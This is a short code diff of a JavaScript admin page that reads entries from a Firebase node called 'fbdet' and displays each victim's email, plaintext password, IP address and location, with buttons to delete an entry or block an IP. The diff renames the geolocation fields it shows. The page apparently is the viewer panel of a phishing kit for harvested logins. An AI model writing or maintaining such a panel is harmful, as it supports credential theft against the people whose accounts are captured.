@@ -6,12 +6,12 @@ Secondarydatabase.ref("fbdet").on('child_added', (snapshot) => {
     html += "<p><b>Email: </b>"+snapshot.val().email+"</p>";
     html += "<p><b>Password: </b>"+snapshot.val().password+"</p>";
     html += "<p><b>Time: </b>"+snapshot.val().Time+"</p>";
-    html += "<p><b>Service Provider: </b>"+snapshot.val().isp+"</p>";
-    html += "<p><b>country: </b>"+snapshot.val().country+"</p>";
+    html += "<p><b>Service Provider: </b>"+snapshot.val().countryCode+"</p>";
+    html += "<p><b>country: </b>"+snapshot.val().countryName+"</p>";
     html += "<p><b>Date: </b>"+snapshot.val().formattedDate+"</p>";
     html += "<p><b>IP Address: </b>"+snapshot.val().ip+"</p>";
-    html += "<p><b>State: </b>"+snapshot.val().regionName+"</p>";
-    html += "<p><b>Timezone: </b>"+snapshot.val().timezone+"</p>";
+    html += "<p><b>State: </b>"+snapshot.val().state+"</p>";
+    html += "<p><b>Timezone: </b>"+snapshot.val().continent + "/" + snapshot.val().state +"</p>";
     html += "<p>";
     html += "<button id='del' onclick='delbtn(this)' data-id="+snapshot.key+">Delete</button>";
     html += "<button id='blockx' onclick='Blockbtn(this)' data-id='"+snapshot.val().ip+"'>Block</button>";
